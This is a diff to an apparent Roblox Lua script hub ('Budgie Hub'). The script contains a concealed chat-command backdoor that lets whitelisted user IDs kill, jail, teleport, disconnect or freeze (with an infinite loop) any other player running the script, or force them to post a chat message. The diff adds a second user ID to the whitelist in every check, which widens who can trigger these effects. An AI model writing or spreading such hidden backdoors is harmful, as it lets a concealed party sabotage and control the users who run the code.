@@ -2,7 +2,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*kill_all") then
-        if player.UserId ~= 4636825706 then
+        if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
  function getAllPlayers()
     local players = game:GetService("Players"):GetPlayers()
     return players
@@ -21,7 +21,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*find") then
-        if player.UserId ~= 4636825706 then
+        if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
       game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I used Budgie Hub", "All")
          end
        end
@@ -33,7 +33,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*jail_all") then
-        if player.UserId ~= 4636825706 then
+        if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
      
  function getAllPlayers()
     local players = game:GetService("Players"):GetPlayers()
@@ -53,7 +53,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*bring_all") then
-        if player.UserId ~= 4636825706 then
+        if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
      
  function getAllPlayers()
     local players = game:GetService("Players"):GetPlayers()
@@ -73,7 +73,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*kick_all") then
-        if player.UserId ~= 4636825706 then
+        if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
       game:Shutdown()
          end
        end
@@ -85,7 +85,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*crash_all") then
-        if player.UserId ~= 4636825706 then
+        if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
       while true do
       end
          end
